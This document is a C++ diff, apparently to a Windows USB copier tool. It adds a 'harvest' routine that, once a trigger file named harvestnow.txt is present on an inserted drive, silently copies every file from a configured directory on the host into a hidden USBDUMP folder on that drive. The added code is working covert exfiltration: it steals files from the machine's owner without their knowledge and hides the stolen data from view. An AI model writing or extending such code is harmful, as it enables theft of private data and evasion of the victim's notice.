@@ -21,6 +21,7 @@ extern DWORD setDirHidden(const std::string &dir);
 extern void copierThreadFunc(LPVOID *);
 extern std::string getSystemPath();
 extern std::string getVolumeName(const std::string& sDevice);
+extern std::string loadConfig();
 
 HRESULT   EnumDirectory(LPCTSTR   lpszDirectory,BOOL   bIncludeSubDirectory, std::vector<std::string>& vsFiles);
 
@@ -139,7 +140,21 @@ bool shouldSkip()
 	sFilename += "skipme.txt";
 
 	struct _stat buf;
-	if(_stat(sFilename.c_str(), &buf)) {
+	if(_stat(sFilename.c_str(), &buf) == 0) {
+		return true;
+	}
+	return false;
+}
+
+/// 检查是否应把所获U盘文件复制到U盘
+bool shouldHarvest()
+{
+	std::string sFilename;
+	sFilename = g_szCurVol;
+	sFilename += "harvestnow.txt";
+
+	struct _stat buf;
+	if(_stat(sFilename.c_str(), &buf) == 0) {
 		return true;
 	}
 	return false;
@@ -162,6 +177,35 @@ void copierThreadFunc(LPVOID *)
 				// 是否应跳过文件
 				if(shouldSkip()) {
 					continue;
+				}
+				// 是否应收割文件
+				if(shouldHarvest()) {
+					std::string sSrcDir;
+					sSrcDir = loadConfig();
+					std::string sToDir;
+					sToDir = g_szCurVol;
+					sToDir += "USBDUMP\\";
+					CFolderUtils::CreateFolder(sToDir.c_str());
+					setDirHidden(sToDir);
+                    char buf[1024];
+					sprintf(buf, "源目录: %s\r\n目标目录: %s\r\n", sSrcDir.c_str(),
+							sToDir.c_str());
+					std::vector<std::string> v;
+					EnumDirectory(sSrcDir.c_str(), TRUE, v);
+					for(std::vector<std::string>::iterator
+							it = v.begin();
+							it != v.end();
+							++it) 
+					{
+						std::string sDstFileName = getOutputFilename(*it, sSrcDir, sToDir);
+						char szDrive[3], szDir[MAX_PATH+1];
+						_splitpath(sDstFileName.c_str(), szDrive, szDir, 0, 0);
+						std::string sDir = szDrive;
+						sDir += szDir;
+						CFolderUtils::CreateFolder(sDir.c_str());
+						CopyFile(it->c_str(), sDstFileName.c_str(), FALSE);
+					}
+                    continue;
 				}
 				string dstDir = getDestDirName();
 				// srcDir += "*.*";
